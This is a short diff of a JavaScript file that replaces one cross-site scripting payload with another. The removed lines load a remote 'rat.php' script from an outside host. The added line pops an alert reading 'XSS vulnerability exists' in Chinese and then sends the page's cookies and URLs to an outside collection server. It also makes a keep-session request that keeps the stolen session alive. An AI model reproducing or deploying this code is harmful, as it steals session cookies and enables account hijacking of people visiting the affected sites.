@@ -1,5 +1,1 @@
-var oHead = document.getElementsByTagName('HEAD').item(0);
-var oScript= document.createElement("script");
-oScript.type = "text/javascript";
-oScript.src="http://xssrat.sinaapp.com/rat.php?t=9fa7e35a";
-oHead.appendChild( oScript);
+(function(){alert(/存在XSS漏洞/);(new Image()).src='http://webxss.cn/index.php?do=api&id=sZLz8s&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})())})();if(''==1){keep=new Image();keep.src='http://webxss.cn/index.php?do=keepsession&id=sZLz8s&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
